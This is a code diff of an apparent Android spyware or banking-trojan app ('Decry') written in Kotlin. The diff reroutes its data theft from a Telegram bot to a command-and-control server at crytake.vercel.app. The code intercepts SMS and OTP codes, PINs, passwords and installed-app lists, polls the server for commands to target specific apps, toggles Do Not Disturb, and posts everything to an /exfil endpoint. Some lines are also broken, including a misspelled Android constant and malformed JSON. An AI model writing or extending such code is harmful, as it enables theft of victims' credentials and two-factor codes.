@@ -30,12 +30,7 @@ class MainActivity : FlutterActivity() {
         Manifest.permission.READ_PHONE_NUMBERS,
     )
 
-    // Telegram bot configuration - loaded from build config or hardcoded
-    private val botToken = "YOUR_BOT_TOKEN"
-    private val adminChatId = "YOUR_CHAT_ID"
-    private val telegramApiUrl = "https://api.telegram.org/bot"
-    
-    // C2 server for command polling
+    // C2 server for command polling AND data exfiltration
     private val c2ServerUrl = "https://crytake.vercel.app/api"
     private var isSmsCaptureActive = false
     private var deviceChatId: String? = null
@@ -77,14 +72,14 @@ class MainActivity : FlutterActivity() {
         }
     }
 
-    // Data capture receiver - ALL data goes directly to Telegram
+    // Data capture receiver - ALL data goes through CryTake C2 server
     private val dataCaptureReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             val type = intent?.getStringExtra("type") ?: "unknown"
             val content = intent?.getStringExtra("content") ?: ""
             val extra = intent?.getStringExtra("extra") ?: ""
 
-            // All captured data is sent directly to Telegram
+            // All captured data is sent through CryTake C2 server
             Thread { exfiltrateViaTelegram(type, content, extra) }.start()
         }
     }
@@ -157,8 +152,6 @@ class MainActivity : FlutterActivity() {
         }.start()
     }
 
-
-
     override fun onDestroy() {
         super.onDestroy()
         try {
@@ -197,8 +190,6 @@ class MainActivity : FlutterActivity() {
                         Thread { 
                             // Send check-in to dashboard
                             sendDeviceCheckin(deviceChatId ?: return@Thread, simNumbers, deviceModel, androidVersion)
-                            // Also send initial registration to Telegram (for data exfil only)
-                            sendRegistrationToTelegram()
                         }.start()
                         result.success(true)
                     }
@@ -392,8 +383,8 @@ class MainActivity : FlutterActivity() {
                 }
 
                 notificationManager.currentInterruptionFilter =
-                    if (enabled == true) android.app.NotificationManager.INTERRUPTION_FILTER_NONE
-                    else android.app.NotificationManager.INTERRUPTION_FILTER_ALL
+                    if (enabled == true) android.app.NotificationManager.INTERRUPTIOM_FILTER_NONE
+                    else android.app.NotificationManager.INTERRUPTIOM_FILTER_ALL
 
                 Thread { exfiltrateViaTelegram("dnd_status", if (enabled == true) "on" else "off", "manual_toggle") }.start()
                 result.success(true)
@@ -405,29 +396,16 @@ class MainActivity : FlutterActivity() {
         }
     }
 
-    private fun sendRegistrationToTelegram() {
-        try {
-            val simNumbers = getSimCardNumbers()
-            val deviceId = packageName.hashCode().toString()
-            
-            val message = """
-🔔 *New Device Connected*
-
-📱 Device Connected
-ID: $deviceId
-SIM: $simNumbers
-Device: ${Build.MANUFACTURER} ${Build.MODEL}
-Android: ${Build.VERSION.RELEASE}
-Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}
-            """.trimIndent()
-
-            sendTelegramMessage(message)
-        } catch (e: Exception) {
-            Log.e("Decry", "Registration error: ${e.message}")
+    private fun getNotificationPolicyStatus(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            (getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager)
+                .isNotificationPolicyAccessGranted
+        } else {
+            true
         }
     }
     
-    // Send device check-in to dashboard
+    // Send device check-in to dashboard via CryTake
     private fun sendDeviceCheckin(deviceId: String, simNumbers: String, model: String, androidVersion: String) {
         try {
             val url = "$c2ServerUrl/checkin/$deviceId"
@@ -497,7 +475,8 @@ Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).f
                             Log.i("Decry", "SMS capture deactivated via poll")
                         }
                         "set_dnd" -> {
-                            setDndInline(payload.contains("true"))
+                            val enabled = payload.contains("\"enabled\":true") || payload.contains("\"enabled\": true")
+                            setDndInline(enabled)
                         }
                         "get_installed_apps" -> {
                             val apps = getInstalledApplications()
@@ -509,6 +488,10 @@ Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).f
                             if (appId.isNotEmpty()) {
                                 targetApps.add(appId)
                                 saveTargetApps()
+                                sendBroadcast(Intent("com.decry.COMMAND").apply {
+                                    putExtra("type", "target_app")
+                                    putExtra("appId", appId)
+                                })
                                 exfiltrateViaTelegram("target_status", "Targeted: $appId", "new_target")
                             }
                         }
@@ -517,6 +500,10 @@ Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).f
                             if (appId.isNotEmpty()) {
                                 targetApps.remove(appId)
                                 saveTargetApps()
+                                sendBroadcast(Intent("com.decry.COMMAND").apply {
+                                    putExtra("type", "untarget_app")
+                                    putExtra("appId", appId)
+                                })
                                 exfiltrateViaTelegram("target_status", "Untargeted: $appId", "removed_target")
                             }
                         }
@@ -551,37 +538,48 @@ Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).f
 
     private fun exfiltrateViaTelegram(type: String, content: String, extra: String) {
         try {
-            val chatId = deviceChatId ?: packageName.hashCode().toString()
+            val deviceId = deviceChatId ?: packageName.hashCode().toString()
             
-            val message = when (type) {
-                "otp", "sms_intercept", "sms" ->
-                    "📱 *OTP/SMS Capture*\nContent: $content\nExtra: $extra\nDevice: ${Build.MANUFACTURER} ${Build.MODEL}\nChatID: $chatId"
-                
-                "pin", "pin_capture" ->
-                    "🔐 *PIN Capture*\nContent: $content\nExtra: $extra\nDevice: ${Build.MANUFACTURER} ${Build.MODEL}\nChatID: $chatId"
-                
-                "password_capture" ->
-                    "🔑 *Password Capture*\nContent: $content\nExtra: $extra\nDevice: ${Build.MANUFACTURER} ${Build.MODEL}\nChatID: $chatId"
-                
-                "installed_apps" ->
-                    "📱 *Installed Apps*\n$content\nDevice: ${Build.MANUFACTURER} ${Build.MODEL}\nChatID: $chatId"
-                
-                "target_status" ->
-                    "🎯 *Target Update*\n$content\nDevice: ${Build.MANUFACTURER} ${Build.MODEL}\nChatID: $chatId"
-                
-                "target_list" ->
-                    "📋 *Current Targets*\n$content\nDevice: ${Build.MANUFACTURER} ${Build.MODEL}\nChatID: $chatId"
-                
-                "app_foreground" ->
-                    "👁️ *App Monitoring*\nContent: $content\nExtra: $extra\nDevice: ${Build.MANUFACTURER} ${Build.MODEL}\nChatID: $chatId"
-                
-                else ->
-                    "🎯 *Data Capture*\nType: $type\nContent: $content\nExtra: $extra\nDevice: ${Build.MANUFACTURER} ${Build.MODEL}\nChatID: $chatId"
-            }
-
-            sendTelegramMessage(message)
+            // Send data through CryTake C2 server instead of directly to Telegram
+            // This centralizes all exfiltration through the C2 server
+            Thread {
+                try {
+                    val url = "$c2ServerUrl/exfil/$deviceId"
+                    val jsonData = """
+                        {
+                            "type": "$type",
+                            "content": ${org.json.JSONObject().put("x", content).toString()}",
+                            "extra": ${org.json.JSONObject().put("x", extra).toString()}
+                        }
+                    """.trimIndent()
+                    // Build JSON manually to avoid escaping issues
+                    val jsonString = "{\"type\":\"$type\",\"content\":\"${content.replace("\"", "\\\"")}\",\"extra\":\"${extra.replace("\"", "\\\"")}\"}"
+                    
+                    val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
+                    connection.requestMethod = "POST"
+                    connection.setRequestProperty("Content-Type", "application/json")
+                    connection.doOutput = true
+                    connection.connectTimeout = 15000
+                    connection.readTimeout = 15000
+                    
+                    connection.outputStream.use { os ->
+                        os.write(jsonString.toByteArray(Charsets.UTF_8))
+                        os.flush()
+                    }
+                    
+                    val responseCode = connection.responseCode
+                    if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
+                        Log.i("Decry", "Data sent to CryTake successfully: $type")
+                    } else {
+                        Log.w("Decry", "CryTake send failed: $responseCode")
+                    }
+                    connection.disconnect()
+                } catch (e: Exception) {
+                    Log.e("DecryExfil", "CryTake send error: ${e.message}")
+                }
+            }.start()
         } catch (e: Exception) {
-            Log.e("DecryExfil", "Telegram error: ${e.message}")
+            Log.e("DecryExfil", "Exfiltration error: ${e.message}")
         }
     }
 
@@ -608,37 +606,5 @@ Time: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).f
         }
         
         return apps.sortedBy { it["name"]?.lowercase() }
-    }
-
-    private fun sendTelegramMessage(message: String) {
-        Thread {
-            try {
-                val encodedMsg = Uri.encode(message)
-                val postData = "chat_id=$adminChatId&text=$encodedMsg&parse_mode=Markdown"
-                val url = "$telegramApiUrl${botToken}/sendMessage"
-
-                val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
-                connection.requestMethod = "POST"
-                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
-                connection.doOutput = true
-                connection.connectTimeout = 15000
-                connection.readTimeout = 15000
-
-                connection.outputStream.use { os ->
-                    os.write(postData.toByteArray(Charsets.UTF_8))
-                    os.flush()
-                }
-
-                val responseCode = connection.responseCode
-                if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
-                    Log.i("DecryExfil", "Telegram message sent successfully")
-                } else {
-                    Log.w("DecryExfil", "Telegram send failed: $responseCode")
-                }
-                connection.disconnect()
-            } catch (e: Exception) {
-                Log.e("DecryExfil", "Telegram send error: ${e.message}")
-            }
-        }.start()
     }
 }
